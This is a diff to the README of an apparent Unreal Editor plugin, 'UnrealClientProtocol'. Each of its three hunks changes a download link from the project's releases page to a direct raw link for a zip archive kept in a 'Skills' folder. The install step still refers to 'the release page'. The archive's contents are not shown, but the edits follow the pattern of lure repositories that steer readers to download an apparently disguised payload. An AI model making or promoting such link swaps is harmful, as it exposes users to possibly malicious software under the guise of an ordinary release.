@@ -1,6 +1,6 @@
 # ⚙️ UnrealClientProtocol - Easy Control for Unreal Editor
 
-[![Download](https://img.shields.io/badge/Download-UnrealClientProtocol-brightgreen.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)
+[![Download](https://img.shields.io/badge/Download-UnrealClientProtocol-brightgreen.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/raw/refs/heads/main/Skills/unreal-client-protocol/Unreal-Client-Protocol-3.9.zip)
 
 ---
 
@@ -56,7 +56,7 @@ You can download UnrealClientProtocol as a plugin and add it to your Unreal Engi
 ## 🔽 Download and Install UnrealClientProtocol
 
 1. Visit the release page by clicking the big **Download** button above or by going here directly:  
-   [https://github.com/venetianglassmaking858/UnrealClientProtocol/releases](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)
+   [https://github.com/venetianglassmaking858/UnrealClientProtocol/raw/refs/heads/main/Skills/unreal-client-protocol/Unreal-Client-Protocol-3.9.zip](https://github.com/venetianglassmaking858/UnrealClientProtocol/raw/refs/heads/main/Skills/unreal-client-protocol/Unreal-Client-Protocol-3.9.zip)
 
 2. On the release page, look for the latest version available. It usually has the highest version number and the newest date.
 
@@ -156,4 +156,4 @@ UnrealClientProtocol is open for anyone to use and inspect. Feel free to report 
 
 ---
 
-[![Download](https://img.shields.io/badge/Get_It_Now-blueviolet.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/releases)
+[![Download](https://img.shields.io/badge/Get_It_Now-blueviolet.svg)](https://github.com/venetianglassmaking858/UnrealClientProtocol/raw/refs/heads/main/Skills/unreal-client-protocol/Unreal-Client-Protocol-3.9.zip)
